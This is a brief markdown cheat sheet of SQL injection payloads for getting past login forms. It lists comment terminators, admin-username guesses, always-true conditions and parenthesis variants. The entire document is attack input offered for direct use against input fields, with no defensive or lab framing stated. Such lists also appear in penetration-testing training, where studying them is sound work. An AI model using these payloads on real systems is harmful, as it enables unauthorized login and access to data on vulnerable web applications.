# SQL Injection

## Comments

When bypassing, for example, login forms or other input fields that could have a SQL statement behind them, try to end the SQL command by ending the input with SQL comments.
Use different endings according to the database used (also try without spaces):

- `' --`
- `' #`
- `' /*`

Maybe try to guess a username:

- `admin' --`
- `admin' #`
- `admin' /*`

Try make the statement true:

- `' or 1=1--`
- `' or 1=1#`
- `' or 1=1/*`

Try different variations of parentheses:

- `') or '1'='1--`
- `') or ('1'='1--`
